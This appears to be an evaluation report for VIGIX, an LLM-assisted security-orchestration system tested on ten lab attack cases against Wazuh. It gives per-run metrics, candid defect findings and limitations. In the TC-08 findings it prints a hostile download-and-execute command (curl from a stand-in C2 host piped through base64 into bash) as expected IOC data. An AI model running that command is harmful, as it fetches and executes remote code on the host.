# VIGIX evaluation summary

Generated 2026-09-30T12:14:38.559Z. **MOCK and REAL_WAZUH results are reported separately and must not be combined.**

## mock-original — MOCK (verification MOCK: NO_MATCH is simulated)

Source: `results/archive/mock-run-pre-real-20260930-174523`

| TC | Attack | Severity | Compliance | Investigation Time | Time-to-Decision | Retries | Intervention | Verification | Final Status |
|---|---|---|---|---:|---:|---:|---|---|---|
| TC-01 | Brute Force | medium | COMPLIANT | 22.35s | 0.06s | 0 | none | RESOLVED (MOCK) | resolved |
| TC-02 | Malware | high | COMPLIANT | 2052.1s | 3426.44s | 0 | none | RESOLVED (MOCK) | resolved |
| TC-03 | Phishing | medium | COMPLIANT | 1539.62s | 0.06s | 13 | ANALYST_IOC_CORRECTION | RESOLVED (MOCK) | resolved |
| TC-04 | Account Compromise | high | COMPLIANT | 2073.71s | 3417.65s | 0 | none | RESOLVED (MOCK) | resolved |
| TC-05 | PowerShell | high | COMPLIANT | 2104.73s | 3385.57s | 0 | none | RESOLVED (MOCK) | resolved |
| TC-06 | SQL Injection | medium | COMPLIANT | 41.53s | 0.05s | 0 | none | RESOLVED (MOCK) | resolved |
| TC-07 | Command & Control | high | COMPLIANT | 3797.68s | 1690.4s | 12 | PLAYBOOK_SEED_UPDATE; MITRE_CATALOG_UPDATE | RESOLVED (MOCK) | resolved |
| TC-08 | Suspicious Process | medium | COMPLIANT | 868.1s | 0.05s | 6 | ANALYST_IOC_CORRECTION | RESOLVED (MOCK) | resolved |
| TC-09 | Data Exfiltration | high | COMPLIANT | 3825.01s | 1660.88s | 12 | PLAYBOOK_SEED_UPDATE; MITRE_CATALOG_UPDATE | RESOLVED (MOCK) | resolved |
| TC-10 | Privilege Escalation | critical | COMPLIANT | 5195.02s | 289.8s | 0 | none | RESOLVED (MOCK) | resolved |

- Recommendation Compliance: **100%** (10/10 evaluated; 6 compliant with no intervention). Counting attempted cases that produced NO valid recommendation as non-compliant: 100% (10/10 attempted)
- Workflow Completion: **100%** (10/10 attempted; 100% of all 10)
- Investigation Time: avg **2151.98s**, median 2062.9s, min 22.35s, max 5195.02s, SD 1693.07s (n=10)
- Time-to-Decision: avg **1387.1s**, median 975.34s, min 0.05s, max 3426.44s, SD 1539.93s (n=10)
- Intervention Rate: **40%** (4/10) — ANALYST_IOC_CORRECTION: 2, PLAYBOOK_SEED_UPDATE: 2, MITRE_CATALOG_UPDATE: 2
- Retry Case Rate: **40%** (4/10 cases with ≥1 retry)
- Total Retry Count: **43** (TC-03=13, TC-07=12, TC-08=6, TC-09=12)
- Verification Result: 10 RESOLVED / 0 NOT_RESOLVED of 10 verified
- Verification Mode: MOCK — MOCK cases 10, REAL_WAZUH cases 0, no verification 0

### Observations / findings (mock-original)

- **TC-01**: MOCK_RUN_CONTAMINATION: this row is NOT a pure mock alert - the incident was built from a real Wazuh alert of agent attack-endpoint; only its verification is mock

## real-clean — REAL_WAZUH

Source: `results/runs/clean-v2-real-wazuh-20260930/run.json` · started 2026-09-30T11:34:54.662Z

| TC | Attack | Severity | Compliance | Investigation Time | Time-to-Decision | Retries | Intervention | Verification | Final Status |
|---|---|---|---|---:|---:|---:|---|---|---|
| TC-01 | Brute Force | medium | COMPLIANT | 23.05s | 0.07s | 0 | none | RESOLVED (REAL_WAZUH) | resolved |
| TC-02 | Malware | high | COMPLIANT | 33.79s | 0.05s | 0 | none | not reached | open |
| TC-03 | Phishing | medium | NOT_EVALUATED | – | – | 5 | none | not reached | open |
| TC-04 | Account Compromise | high | COMPLIANT | 41.55s | 0.05s | 0 | none | RESOLVED (REAL_WAZUH) | resolved |
| TC-05 | PowerShell | high | ENVIRONMENT_UNAVAILABLE | – | – | – | none | – | ENVIRONMENT_UNAVAILABLE |
| TC-06 | SQL Injection | medium | COMPLIANT | 22.32s | 0.04s | 0 | none | RESOLVED (REAL_WAZUH) | resolved |
| TC-07 | Command & Control | high | COMPLIANT | 98.12s | 0.06s | 0 | none | RESOLVED (REAL_WAZUH) | resolved |
| TC-08 | Suspicious Process | medium | NOT_EVALUATED | – | – | 5 | none | not reached | open |
| TC-09 | Data Exfiltration | high | COMPLIANT | 38.09s | 0.06s | 0 | none | RESOLVED (REAL_WAZUH) | resolved |
| TC-10 | Privilege Escalation | critical | COMPLIANT | 24.97s | 0.06s | 0 | none | not reached | open |

- Recommendation Compliance: **100%** (7/7 evaluated; 7 compliant with no intervention). Counting attempted cases that produced NO valid recommendation as non-compliant: 77.78% (7/9 attempted)
- Workflow Completion: **55.56%** (5/9 attempted; 50% of all 10)
- Investigation Time: avg **40.27s**, median 33.79s, min 22.32s, max 98.12s, SD 26.61s (n=7)
- Time-to-Decision: avg **0.06s**, median 0.06s, min 0.04s, max 0.07s, SD 0.01s (n=7)
- Intervention Rate: **0%** (0/9) 
- Retry Case Rate: **22.22%** (2/9 cases with ≥1 retry)
- Total Retry Count: **10** (TC-03=5, TC-08=5)
- Verification Result: 5 RESOLVED / 0 NOT_RESOLVED of 5 verified
- Verification Mode: REAL_WAZUH — MOCK cases 0, REAL_WAZUH cases 5, no verification 4

### Observations / findings (real-clean)

- **TC-02**: EXPECTED_IOC_MISSING (before any correction): hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f, file:/root/Downloads/Invoice_Q4_2026.xls.exe · REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA "No supported IOC is available to query." — no verification, incident not resolved · ACTION_DIFFERS_FROM_PREFERRED: actual [ACT-ISOLATE-ENDPOINT] vs preferred [ACT-QUARANTINE-FILE,ACT-BLOCK-HASH] (allowed set still governs compliance)
- **TC-03**: NO_VALID_RECOMMENDATION after 5 attempts
- **TC-05**: ENVIRONMENT_UNAVAILABLE: Requires a Windows endpoint with a Wazuh agent (Sysmon/PowerShell logging). None exists in this environment.
- **TC-07**: SELF_TARGETING_STEP (not counted in the six criteria): ACT-BLOCK-DESTINATION-IP targets 172.19.0.5, the monitored endpoint's own address; the compliance evaluator accepts it because that IP is an evidence-linked IOC
- **TC-08**: EXPECTED_IOC_MISSING (before any correction): process:/tmp/.cache/kworkerd, command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash · NO_VALID_RECOMMENDATION after 5 attempts
- **TC-10**: REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA "No supported IOC is available to query." — no verification, incident not resolved

## real-intervention — REAL_WAZUH

Source: `results/runs/intervention-v2-real-wazuh-20260930/run.json` · started 2026-09-30T11:54:08.091Z

| TC | Attack | Severity | Compliance | Investigation Time | Time-to-Decision | Retries | Intervention | Verification | Final Status |
|---|---|---|---|---:|---:|---:|---|---|---|
| TC-01 | Brute Force | medium | COMPLIANT | 22.18s | 0.06s | 0 | none | RESOLVED (REAL_WAZUH) | resolved |
| TC-02 | Malware | high | COMPLIANT | 56.9s | 0.06s | 0 | none | not reached | open |
| TC-03 | Phishing | medium | COMPLIANT | 265.41s | 0.06s | 3 | ANALYST_IOC_CORRECTION | RESOLVED (REAL_WAZUH) | resolved |
| TC-04 | Account Compromise | high | COMPLIANT | 34.28s | 0.06s | 0 | none | RESOLVED (REAL_WAZUH) | resolved |
| TC-05 | PowerShell | high | ENVIRONMENT_UNAVAILABLE | – | – | – | none | – | ENVIRONMENT_UNAVAILABLE |
| TC-06 | SQL Injection | medium | COMPLIANT | 22.07s | 0.05s | 0 | none | RESOLVED (REAL_WAZUH) | resolved |
| TC-07 | Command & Control | high | COMPLIANT | 47.8s | 0.06s | 0 | none | RESOLVED (REAL_WAZUH) | resolved |
| TC-08 | Suspicious Process | medium | COMPLIANT | 128.9s | 0.06s | 3 | ANALYST_IOC_CORRECTION | RESOLVED (REAL_WAZUH) | resolved |
| TC-09 | Data Exfiltration | high | COMPLIANT | 46.46s | 0.06s | 0 | none | RESOLVED (REAL_WAZUH) | resolved |
| TC-10 | Privilege Escalation | critical | COMPLIANT | 26.05s | 0.05s | 0 | none | not reached | open |

- Recommendation Compliance: **100%** (9/9 evaluated; 7 compliant with no intervention). Counting attempted cases that produced NO valid recommendation as non-compliant: 100% (9/9 attempted)
- Workflow Completion: **77.78%** (7/9 attempted; 70% of all 10)
- Investigation Time: avg **72.23s**, median 46.46s, min 22.07s, max 265.41s, SD 79.55s (n=9)
- Time-to-Decision: avg **0.06s**, median 0.06s, min 0.05s, max 0.06s, SD 0s (n=9)
- Intervention Rate: **22.22%** (2/9) — ANALYST_IOC_CORRECTION: 2
- Retry Case Rate: **22.22%** (2/9 cases with ≥1 retry)
- Total Retry Count: **6** (TC-03=3, TC-08=3)
- Verification Result: 7 RESOLVED / 0 NOT_RESOLVED of 7 verified
- Verification Mode: REAL_WAZUH — MOCK cases 0, REAL_WAZUH cases 7, no verification 2

### Observations / findings (real-intervention)

- **TC-02**: EXPECTED_IOC_MISSING (before any correction): hash:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f, file:/root/Downloads/Invoice_Q4_2026.xls.exe · REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA "No supported IOC is available to query." — no verification, incident not resolved · ACTION_DIFFERS_FROM_PREFERRED: actual [ACT-ISOLATE-ENDPOINT] vs preferred [ACT-QUARANTINE-FILE,ACT-BLOCK-HASH] (allowed set still governs compliance)
- **TC-05**: ENVIRONMENT_UNAVAILABLE: Requires a Windows endpoint with a Wazuh agent (Sysmon/PowerShell logging). None exists in this environment.
- **TC-07**: SELF_TARGETING_STEP (not counted in the six criteria): ACT-BLOCK-DESTINATION-IP targets 172.19.0.5, the monitored endpoint's own address; the compliance evaluator accepts it because that IP is an evidence-linked IOC
- **TC-08**: EXPECTED_IOC_MISSING (before any correction): process:/tmp/.cache/kworkerd, command:curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash
- **TC-09**: SELF_TARGETING_STEP (not counted in the six criteria): ACT-BLOCK-DESTINATION-IP targets 172.19.0.5, the monitored endpoint's own address; the compliance evaluator accepts it because that IP is an evidence-linked IOC
- **TC-10**: REHUNT_FAILED: REHUNT_INSUFFICIENT_CRITERIA "No supported IOC is available to query." — no verification, incident not resolved

## real-recurrence-control — REAL_WAZUH

Source: `results/runs/control-recurrence-real-wazuh-20260930/run.json` · started 2026-09-30T12:11:19.884Z

| TC | Attack | Severity | Compliance | Investigation Time | Time-to-Decision | Retries | Intervention | Verification | Final Status |
|---|---|---|---|---:|---:|---:|---|---|---|
| TC-01 | Brute Force | medium | COMPLIANT | 21.22s | 0.06s | 1 | none | NOT_RESOLVED (REAL_WAZUH) | investigating |

- Recommendation Compliance: **100%** (1/1 evaluated; 1 compliant with no intervention). Counting attempted cases that produced NO valid recommendation as non-compliant: 100% (1/1 attempted)
- Workflow Completion: **100%** (1/1 attempted; 100% of all 1)
- Investigation Time: avg **21.22s**, median 21.22s, min 21.22s, max 21.22s, SD 0s (n=1)
- Time-to-Decision: avg **0.06s**, median 0.06s, min 0.06s, max 0.06s, SD 0s (n=1)
- Intervention Rate: **0%** (0/1) 
- Retry Case Rate: **100%** (1/1 cases with ≥1 retry)
- Total Retry Count: **1** (TC-01=1)
- Verification Result: 0 RESOLVED / 1 NOT_RESOLVED of 1 verified
- Verification Mode: REAL_WAZUH — MOCK cases 0, REAL_WAZUH cases 1, no verification 0

### Observations / findings (real-recurrence-control)

- **TC-01**: RECURRENCE_CONTROL: attack repeated 2026-09-30T12:12:17.800Z after the response completed; recurrence alert seen in the indexer (1790770358.1896566)

## mock-repeated-single-pass — MOCK (N=2)

Clean uninterrupted latencies for the MOCK pipeline (fresh alerts each run, no manual gap). Overall: compliance 100%, investigation 53.09s ± 29.05, decision 0.05s ± 0.01. Verification not exercised in this harness.

## A. Environment (Real-Wazuh runs)

| Item | Value |
|---|---|
| Wazuh Manager / Indexer / Dashboard | 4.9.2 (wazuh-docker single-node; manager API UP, indexer cluster green) |
| Wazuh Agent | 4.9.2 on `attack-endpoint` (Ubuntu 22.04 container, Active) |
| Attack sources / sink | `vigix-lab-attacker` (Alpine), `vigix-eval-testserver` (python sink, no published ports) — all on the isolated `single-node_default` Docker network |
| Custom Wazuh rules | `infra/docker/wazuh-manager/vigix_eval_rules.xml` + `vigix_eval_decoders.xml` (ids 100301/100310/100320/100330/100340/100350) |
| VIGIX backend | real use cases driven by `apps/backend/scripts/eval/run-real-evaluation.ts` (production-parity wiring since Clean Run v2); notifications stubbed |
| PostgreSQL | 16, database `soar_eval` (copy of `soar_platform`, workflow data truncated, KB kept); `soar_platform` was never written |
| AI orchestrator | second instance on :8001 bound to `soar_eval` (LangGraph) |
| LLM | provider `openrouter`, model `google/gemma-4-26b-a4b-it` — `LLM_PROVIDER` is defined twice in `apps/ai-orchestrator/.env` (openai-compatible, then openrouter); the last value is assumed to win and was not verified at runtime |
| Verification mode | **REAL_WAZUH** (`REHUNT_PROVIDER=wazuh`, `WazuhRehuntAdapter` against the live indexer); `CleanRehuntAdapter` was NOT used |
| Recommendation agent | `LlmRecommendationAgent` (`RECOMMENDATION_AGENT=llm` exported into the eval process only; `apps/backend/.env` still says `fake` and was not touched) |
| Scoring | deterministic (`EvaluationService.evaluateCompliance`), ground truth frozen in `groundTruthReal.ts` (sha256 in each run.json); no LLM judge |

Run register: `results/runs/README.md`. **Primary Clean Run = `clean-v2-real-wazuh-20260930`; Intervention Run = `intervention-v2-real-wazuh-20260930`.** Run #1 and the partial post-fix run are kept as superseded evidence. `control-recurrence-real-wazuh-20260930` is a verification-sensitivity control, not part of the 10-case KPIs.

## B. Test-case status (Real Wazuh)

| TC | Telemetry | Status |
|---|---|---|
| TC-01 Brute Force | real SSH failures, **stock rule 5712** | full workflow, REAL_WAZUH RESOLVED |
| TC-02 Malware | real EICAR file, FIM + **custom rule 100301** | recommendation COMPLIANT; re-hunt impossible (no hash IOC) → incident stays open |
| TC-03 Phishing | **controlled telemetry** + custom rule 100310 (no e-mail sent, no traffic) | Clean: no valid recommendation (5 retries); Intervention: analyst IOC confirmation → COMPLIANT, RESOLVED |
| TC-04 Account Compromise | real SSH failures then success, **stock rule 40112** | full workflow, RESOLVED |
| TC-05 PowerShell | – | **ENVIRONMENT_UNAVAILABLE** (no Windows endpoint) — not simulated, not reported as Real |
| TC-06 SQL Injection | real HTTP requests to nginx, **stock rule 31103** | full workflow, RESOLVED |
| TC-07 C2 | real HTTP beacons to the Docker test server + controlled telemetry, custom rule 100320 | full workflow, RESOLVED |
| TC-08 Suspicious Process | real process + controlled telemetry (`data.audit.*`), custom rule 100330 | Clean: blocked by the validator (no COMMAND_LINE evidence); Intervention: analyst IOCs → COMPLIANT, RESOLVED (weak — see F9) |
| TC-09 Data Exfiltration | real 3 MB HTTP POST to the sink + controlled telemetry, custom rule 100340 | full workflow, RESOLVED |
| TC-10 Privilege Escalation | real `useradd` + `usermod -aG sudo`, **custom rule 100350** (no stock rule exists) | recommendation COMPLIANT; re-hunt impossible (username-only IOC) → incident stays open |

Only TC-01, TC-04 and TC-06 are stock-Wazuh detections. TC-02/07/09/10 use custom rules written for this evaluation and TC-03/08 additionally depend on harness-generated telemetry; their results say nothing about stock Wazuh coverage.

## E. Findings and interventions (nothing hidden)

Interventions applied (Intervention Run only; Clean Run applied none): **TC-03** analyst confirmed 4 IOCs (URL, domain, IP, e-mail — only the e-mail was the blocker, so this over-corrects); **TC-08** analyst added PROCESS_NAME and COMMAND_LINE IOCs. Category: `ANALYST_IOC_CORRECTION` (2 cases). No KB/MITRE/playbook seed changes were made during any run; the Knowledge Base was complete before the runs (preflight: 11 playbooks, 26 techniques, 14 actions).

Environment/harness corrections made BETWEEN runs (each recorded, none silent):

| # | Finding | Type | Action |
|---|---|---|---|
| F1 | Custom rule 100301 used `.+` under Wazuh's default OS_Regex, which does not support it → Clean Run #1 TC-02: `WAZUH_ALERT_MISSING` (FIM did see the file, rule 554, exact EICAR sha256) | ENVIRONMENT_CORRECTION (my rule) | `type="pcre2"`; re-verified in the post-fix and v2 runs |
| F2 | Wazuh's index template maps `data.process` as an **object**; a scalar `data.process` is rejected by the indexer (`mapper_parsing_exception`) — the alert existed in `alerts.json` but never reached the indexer | ENVIRONMENT_CORRECTION | TC-08 telemetry moved to the auditd layout `data.audit.*` |
| F3 | TC-08 harness read `/proc/PID/exe` (needs CAP_SYS_PTRACE) and would have fallen back to constants; the honesty guard aborted the case | HARNESS BUG | read `/proc/PID/cmdline`; no fallback values |
| F4 | The older evaluation scripts (and my first harness copy) build `RecommendationContextBuilder` **without** `responseSetup` and `compliancePolicy`, unlike `container.ts` | EVALUATION-DESIGN DEFECT | new harness has production parity; **the archived MOCK results were produced without them** |
| F5 | **PlaybookSelector**: Wazuh asserted T1048, the AI mapper added T1071.001 → 1:1 tie between PB-DATA-EXFIL and PB-C2, broken by code order → PB-C2 (`PLAYBOOK_MISMATCH`, NON_COMPLIANT in Run #1). An AI-inferred technique could flip the deterministic playbook | VIGIX DEFECT (selector) | SIEM-asserted techniques now win an equal-count tie before specificity/code order; 4 unit tests (`test/PlaybookSelectorTieBreak.test.ts`), related suites green; Clean v2 TC-09 = PB-DATA-EXFIL. Ground truth was not changed |
| F6 | The ground truth listed `user:admin` as the expected IOC of TC-01, but rule 5712 fires on the 8th failed attempt so the alert names another user | GROUND-TRUTH SPEC ERROR | now "any attempted user"; corrected before Clean Run #1 on the evidence of a discarded smoke test, not on AI output |

Behaviours observed (not changed):

| # | Finding |
|---|---|
| F7 | TC-03: the sender e-mail is extracted as an IOC but is not evidence-linked/actionable, so `ACT-QUARANTINE-EMAIL` is rejected (INVENTED_TARGET / TARGET_TYPE_MISMATCH) on every attempt — same defect as the earlier MOCK run; reproducible in Clean #1 and Clean v2 (5 retries, no valid recommendation) |
| F8 | TC-08: the IOC extractor reads `data.process` / `data.command` but not `data.audit.*` (where real auditd events put them), so no PROCESS/COMMAND IOC exists; `ACT-KILL-PROCESS` (needs COMMAND_LINE) and `ACT-QUARANTINE-FILE` (needs FILE_HASH) are blocked. The validator behaved as specified (no kill without evidence). Same for TC-02: the extractor ignores `syscheck.*`, so the FIM hash/path never become IOCs |
| F9 | Re-hunt hunts only IP/domain/URL/hash IOCs. TC-02 and TC-10 have none → `REHUNT_INSUFFICIENT_CRITERIA`, no verification, incident correctly stays open (a failed re-hunt proves nothing). TC-08's RESOLVED searched only the C2 URL/domain taken from the command line — it does **not** verify that the process stopped |
| F10 | TC-07 (Run #1, Clean v2 and Intervention) and TC-09 (Intervention Run only; Clean v2 targeted the real destination 172.19.0.8): step 1 `ACT-BLOCK-DESTINATION-IP` targets `172.19.0.5` — the monitored endpoint's **own** address (the real destination is 172.19.0.8). It passes `evidenceSupport` (membership in the incident's IOCs). Reported as `SELF_TARGETING_STEP`, outside the six-criteria KPI; a role-aware IP check would catch it. The re-hunt excluded 172.19.0.5 as the endpoint identity |
| F11 | Stock Wazuh 4.9.2 gaps: no decoder/rule for `usermod -aG sudo` (TC-10); FIM new-file (554) is level 5, below the level-7 forwarding threshold (TC-02); FIM modification (550) maps to T1565.001, not malware |
| F12 | Stock rule 40112 asserts T1078 **and** T1110; the selector picked PB-ACCOUNT-COMPROMISE as ground truth expects (tie-break by code order among equal scores) |
| F13 | Phase A (existing MOCK evaluation): `run-evaluation.ts` selects the latest alert **by rule id only**, so the archived "TC-01 (mock)" row was built from a **real** alert of agent `attack-endpoint` with a mock verification — a hybrid, flagged in the report. Its timings include manual gaps (max 5195 s); its intervention count treats retries as interventions; its verification is `CleanRehuntAdapter` (NO_MATCH simulated) |
| F14 | `custom-vigix` logged integration errors for some alerts (11:23:31, 11:26:04). Not investigated: the harness reads the alert from the indexer and ingests it through the same normalize/ingest use cases, so the webhook hop was **not** part of the evaluation DB path |
| F15 | The TC-03/08 retry counts show LLM variance: in the Intervention Run TC-03 and TC-08 each still had 3 failed generation attempts (before and after the analyst correction) |

## F. Limitations

- **Sample size:** 10 cases (9 attempted, TC-05 unavailable); one run per condition. Real-Wazuh statistics are single-pass; only the MOCK pipeline has a repeated single-pass file (N=2). No confidence intervals.
- **MOCK vs REAL:** reported separately and not comparable one-to-one (different alerts, ground truth keyed to different rules, mock TC-01 is a hybrid). MOCK verification is `CleanRehuntAdapter`: **NO_MATCH is simulated** — it shows the workflow can reach Verification and close an incident, not that any threat was removed.
- **Real verification is not proof of containment:** every response is a *simulated* manual response (no firewall/account/process action was taken) and each attack ran once, so a `RESOLVED` mainly says "no recurrence appeared in a ~20 s window". The recurrence **control** shows the check is not vacuous: when the TC-01 attack was repeated after the response, the live re-hunt returned 29 matching events, `iocRecurrence=true` → `NOT_RESOLVED`, the incident stayed `investigating` and Investigation #2 opened (Policy RULE-V01/V03). That control ran once on one case.
- **Manual intervention & scripted humans:** SOC triage, SOC→IR hand-off and the IR approval are scripted API calls standing in for people; the analyst correction is a script with a fixed rule ("add IOCs the alert evidences when the recommendation is blocked"), not a human judgement.
- **Timing gaps:** Real runs are uninterrupted, so Time-to-Decision (≈0.05 s) is the latency of a scripted decision, **not** human decision time. The MOCK stepwise timings contain manual gaps of hours and must not be read as latencies. Investigation Time in the Real runs includes LLM latency and retry rounds.
- **Environment:** containers on private 172.19.0.0/16 addresses; TC-03/07/08/09 rely on harness-generated telemetry and custom rules; no Windows endpoint; TC-02/07/09/10 detections exist only because of custom rules. Wazuh, the LLM (single model via OpenRouter) and VirusTotal/MISP CTI were not varied; CTI verdicts were not evaluated as a metric.
- **ML risk score:** `risk_scores` is empty (0 rows) — no ML output was produced or evaluated.
- **LLM repeated-run reliability:** not tested for the Real pipeline (single run per condition); the retry counts (Clean: TC-03 = 5, TC-08 = 5; Intervention: 3 and 3) hint at variance but are not a reliability study.
- **Production parity gaps that remain:** `CreateVerification` runs without `sendRecommendationToIr` (only matters for a NOT_RESOLVED round — exercised once in the control); AI analysis is run synchronously instead of via the worker queue; the webhook hop (F14) is bypassed.
- **Compliance semantics:** the six criteria check membership/allowed sets, not semantic correctness (F10); compliance is 100% of *evaluated* cases in both Real runs, while cases that produced no valid recommendation (Clean: TC-03, TC-08) are excluded from that denominator — both ratios are printed.
